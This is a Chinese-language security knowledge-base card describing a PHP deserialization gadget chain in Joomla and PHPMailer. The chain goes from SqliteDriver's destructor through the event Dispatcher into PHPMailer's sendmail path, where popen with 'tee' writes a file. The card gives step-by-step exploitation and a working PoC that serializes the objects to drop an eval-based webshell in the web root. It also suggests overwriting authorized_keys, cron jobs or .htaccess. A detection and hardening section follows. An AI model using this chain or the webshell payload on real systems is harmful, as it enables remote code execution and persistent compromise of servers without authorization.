---
id: web-php-deserialization-joomla-phpmailer-sendmail-file-write
title: Joomla SqliteDriver 析构 + PHPMailer sendmailSend：反序列化链经 popen/tee 写 WebShell
type: scenario
domain: web
path: web/php/deserialization
technique: joomla-phpmailer-pop-chain-sendmail-file-write
tags:
- php
- joomla
- phpmailer
- deserialization
- pop-chain
- destruct
- event-dispatcher
- file-write
- webshell
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V58
  verified_at: '2026-11-05T09:02:06+08:00'
  notes: 已对照原文与21张图片核对：SqliteDriver::__destruct→DatabaseDriver::disconnect→dispatchEvent(ConnectionEvent('onAfterDisconnect',))→Dispatcher::dispatch→[,'send']→send→postSend→sendmailSend→sprintf('%s -oi -f%s -t',escapeshellcmd(Sendmail),Sender)→popen('w')+fwrite(body) 全链与图01-37一致；PdoDriver::__wakeup 需  为数组、PoC 补 protected $options 后成功，shell1.php?1=system('whoami') 回显及 PHPMailer 6.10.0 邮件头与图39一致。未验证点：原文环境 Joomla 6.0.0+PHPMailer 6.10.0 为复现环境，未给受影响版本区间，故未设 affected_versions；反序列化入口为原文 unser.php 模拟，实际入口未验证；PoC 未本机执行；frontmatter 无 sources/source_url。
url: /docs/web/php/deserialization/web-php-deserialization-joomla-phpmailer-sendmail-file-write/
draft: false
kb_aliases:
- Joomla 反序列化链
- SqliteDriver __destruct
- DatabaseDriver disconnect dispatchEvent
- Dispatcher onAfterDisconnect 事件
- PHPMailer sendmailSend 任意文件写
- popen tee 写 webshell
- Joomla + PHPMailer POP 链
---

## 一句话结论

在存在 `unserialize()` 入口的 Joomla 应用（原文环境 Joomla 6.0.0 + PHPMailer 6.10.0）中，可构造 `SqliteDriver` 对象：其析构函数触发 `DatabaseDriver::disconnect()`，经 `dispatchEvent()` 把 `onAfterDisconnect` 事件交给可控的 `Dispatcher`，回调列表被设置为 `[$phpmailer, 'send']`，最终进入 `PHPMailer::sendmailSend()`；该方法把可控的 `$Sendmail` 经 `escapeshellcmd` 后拼入 `popen($sendmail, 'w')`，配合 `fwrite($mail, $body)` 把 `$Body` 原样写入 `tee` 的目标文件，从而在 Web 目录落下 PHP WebShell 并执行任意命令。

## 原理

- **入口类与析构链**：`SqliteDriver extends PdoDriver extends DatabaseDriver`。`SqliteDriver::__destruct()` 调用 `$this->disconnect()`；父类 `DatabaseDriver` 也定义了 `__destruct()` 调用 `disconnect()`，因此对象销毁即自动进入数据库断开逻辑，无需业务代码显式调用。
- **disconnect 派发事件**：`DatabaseDriver::disconnect()` 依次执行 `freeResult()`、`connection = null`，然后 `dispatchEvent(new ConnectionEvent(DatabaseEvents::POST_DISCONNECT, $this))`。`DatabaseEvents::POST_DISCONNECT` 的值是字符串 `'onAfterDisconnect'`；`ConnectionEvent` 构造器调用 `parent::__construct($name)` 并保存 driver。
- **事件分发可控**：`DatabaseDriver::dispatchEvent()` 执行 `$this->getDispatcher()->dispatch($event->getName(), $event)`。反序列化可把 `$dispatcher` 设为攻击者构造的 `Joomla\Event\Dispatcher`，其 `$listeners` 属性同样可控。
- **Dispatcher 回调任意可调用值**：`Dispatcher::dispatch()` 遍历 `$listeners[$event->getName()]`，对每个 `$listener` 执行 `$listener($event)`。把 `$listeners` 设为 `['onAfterDisconnect' => [[$phpmailer, 'send']]]`，`$listener` 就是数组回调 `[$phpmailer, 'send']`，等价于调用 `PHPMailer::send()`。
- **PHPMailer 侧到文件写**：`PHPMailer::send()` 先调用 `preSend()`（原文 PoC 通过填充 From/Sender/Body/cc、`AllowEmpty=false` 等让其为 true），再调用 `postSend()`；`postSend()` 根据 `$Mailer` 选择分支，`'sendmail'`、`'qmail'`、`'gmail'` 都进入 `sendmailSend($this->MIMEHeader, $this->MIMEBody)`。
- **sendmailSend 的 sink**：`sendmailSend()` 用 `sprintf('%s -oi -f%s -t', escapeshellcmd($this->Sendmail), $this->Sender)` 生成命令，随后 `$mail = @popen($sendmail, 'w')`，再 `fwrite($mail, $body)`（以及 From/Subject 等头）。`escapeshellcmd` 会转义 shell 元字符，但不会禁止空格、斜杠和参数，因此把 `$Sendmail` 设为 `tee /var/www/html/tmp/shell.php --` 仍然是合法命令；`popen(..., 'w')` 把 `$Body` 送到 `tee` 的 stdin，`tee` 将其写入目标文件，`$Body` 即成为落盘的 PHP 代码。
- **为什么能成链**：反序列化可同时控制各对象的属性（`$dispatcher`、`$listeners`、PHPMailer 公共/受保护属性），而 `__destruct → disconnect → dispatchEvent → dispatch → send → postSend → sendmailSend → popen` 全程没有对回调目标、事件名或 sendmail 路径做类型/白名单校验；唯一限制是 `escapeshellcmd` 的字符过滤，而 `tee` 本身不需要元字符即可实现文件写。
- **绕开 `__wakeup` 的坑**：`SqliteDriver` 继承 `PdoDriver::__wakeup()`，其中执行 `$this->__construct($this->options)`，而 `__construct(array $options)` 要求数组。序列化时若不给 `$options`，`unserialize` 会先抛 `TypeError` 导致利用失败；给 `SqliteDriver` 补上 `protected $options = ['driver' => '...']` 即可让 `__wakeup` 正常返回，随后析构链继续执行。

## 触发条件

- 应用基于 Joomla（原文复现环境 Joomla 6.0.0，PHPMailer 6.10.0），且存在对攻击者可控数据调用 `unserialize()` 的入口（原文用 `unser.php` 模拟该入口）。
- 目标运行环境加载了 Joomla Database、Joomla Event Dispatcher 与 PHPMailer 的自动加载/类定义（Joomla 正常安装即具备）。
- 反序列化未使用 `allowed_classes` 白名单或等价限制，允许还原 `Joomla\Database\Sqlite\SqliteDriver`、`Joomla\Event\Dispatcher`、`PHPMailer\PHPMailer\PHPMailer`。
- Web 进程对目标目录有写权限（PoC 写 `/var/www/html/tmp/shell.php`）。
- 服务器为类 Unix 环境且存在 `tee`、`sendmail/qmail` 命令（`popen` 可用；Windows 下需按环境调整）。

## 利用步骤

1. 确认存在 `unserialize()` 可控入口，并确认 Joomla/PHPMailer 版本与类路径。
2. 构造 `PHPMailer` 对象：`$Mailer='qmail'`（或 `sendmail`）、`$Sendmail='tee /var/www/html/tmp/shell.php --'`、`$Body='<?php eval($_GET[1]);?>'`、`$Sender`/`$From`/`$cc` 等填充到让 `preSend()` 返回 true、`$AllowEmpty=false`、`$CharSet` 合法。
3. 构造 `Joomla\Event\Dispatcher`，`$listeners = ['onAfterDisconnect' => [[$phpmailer, 'send']]]`。
4. 构造 `SqliteDriver`，设置 `protected $dispatcher = $dispatcher`，并设置 `protected $options = ['driver' => '...']` 以通过 `PdoDriver::__wakeup()` 的 `__construct(array $options)` 调用。
5. 序列化 `SqliteDriver` 并提交给 `unserialize` 入口；对象析构时自动触发事件回调，调用 `PHPMailer::send()`，最终 `tee` 把 `$Body` 写入目标路径。
6. 访问写入的 PHP 文件（如 `/tmp/shell.php?1=system('whoami');`）验证命令执行；测试后删除 WebShell。

## PoC

原文 PoC（修正版，关键部分）：

```php
<?php
namespace Joomla\Database\Sqlite{
    class SqliteDriver{
        protected $dispatcher;
        protected $options = ['driver' => 'MeteorKai']; // 需为数组，供 PdoDriver::__wakeup 调用 __construct
        public function __construct($dispatcher){
            $this->dispatcher = $dispatcher;
        }
    }
}

namespace Joomla\Event{
    class Dispatcher{
        protected $listeners = [];
        public function __construct($listeners){
            $this->listeners = $listeners;
        }
    }
}

namespace PHPMailer\PHPMailer{
    class PHPMailer{
        public $Mailer   = 'qmail';
        public $Sender   = 'MeteorKai@qq.com';
        public $Sendmail = 'tee /var/www/html/tmp/shell1.php --';
        public $CharSet  = 'iso-8859-1';
        public $Body     = '<?php eval($_GET[1]);?>';
        public $From     = 'MeteorKai@example.com';
        public $AllowEmpty = false;
        protected $cc = [['MeteorKai@qq.com', 'MeteorKai']];
    }
}

namespace{
    $phpmailer  = new \PHPMailer\PHPMailer\PHPMailer();
    $dispatcher = new \Joomla\Event\Dispatcher(['onAfterDisconnect' => [[$phpmailer, 'send']]]);
    $driver     = new \Joomla\Database\Sqlite\SqliteDriver($dispatcher);
    echo urlencode(base64_encode(serialize($driver)));
}
```

生成的 payload 经 URL 解码/Base64 解码后提交给 `unserialize` 入口。原文截图显示写入的 `shell1.php` 可执行 `system('whoami')`，页面同时输出了 PHPMailer 6.10.0 生成的邮件头，证明落盘的是 `$Body` 内容。

## 变体与关联

- **写入目标变化**：把 `$Sendmail` 中的 `tee /path` 换成其他接受 stdin 的命令（如 `dd of=/path`、`cat > /path` 需元字符被过滤，故 `tee` 最直接）；也可覆盖 `.htaccess`、模板、计划任务、`authorized_keys` 等。
- **$Sender 注入面**：`sprintf` 的 `-f%s` 中 `$Sender` 未经过 `escapeshellcmd`（原文 PoC 未利用）；若格式分支与过滤条件允许，`$Sender` 可能成为第二处命令注入点，需按实际 PHPMailer 版本验证。
- **其他事件名/回调**：`Dispatcher` 的 `$listeners` 可用任意事件名映射到任意 PHP callable（静态方法、函数名、其它对象方法），不限于 `send`。
- **其他驱动析构**：`DatabaseDriver::__destruct()` 同样调用 `disconnect()`；任何继承 `DatabaseDriver` 且反序列化后可实例化的驱动都可能作为链头（原文明示 `DataBaseDriver` 为抽象类，实际用 `SqliteDriver`）。
- **同族风险**：PHPMailer 在旧版本中还存在 `$Sender` 拼接导致的命令注入类 CVE（如 CVE-2016-10033/10045），本链利用的是 `$Sendmail` + `popen` 的“合法 tee”路径，不依赖 shell 元字符。
- **关联卡片**：[[web-php-deserialization-pop-filelogger-webshell]]（同为反序列化 POP 链写 WebShell，sink 不同）、[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（魔术方法链）、[[web-php-deserialization-compressed-phar-include-bypass]]（Phar 触发反序列化）。

## 检测与防御

- **入口防护**：禁止对用户输入直接 `unserialize()`；必须使用时用 `allowed_classes` 白名单，或改用 JSON/签名格式；对 Joomla 输入做类型与来源校验。
- **升级/修补**：跟踪 Joomla 与 PHPMailer 的安全更新；在应用侧禁止不可信对象图进入 `SqliteDriver`/`Dispatcher` 等链头类。
- **配置加固**：Web 进程对 Web 目录只读（上传/缓存目录除外且禁止 PHP 执行）；`disable_functions` 禁用 `popen`/`proc_open`/`exec` 等（注意 PHPMailer 邮件功能可能受影响）；限制 `tee` 等命令与 `sendmail` 路径。
- **检测**：请求体中出现 `O:` 序列化对象、`Joomla\Database\Sqlite\SqliteDriver`、`Joomla\Event\Dispatcher`、`onAfterDisconnect`、`PHPMailer\PHPMailer\PHPMailer` 等特征；Web 目录出现非预期 `.php` 文件，内容含 `eval`/`$_GET`；进程树出现 `tee` 写入 Web 目录；页面输出 PHPMailer 邮件头而业务本不应发信。
- **排查**：审计反序列化调用点与 `DatabaseDriver::disconnect` 的事件监听器来源；检查 `Dispatcher` 的 `$listeners` 是否可被外部对象注入；检查 PHPMailer `$Sendmail`/`$Sender` 是否来自不可信数据。
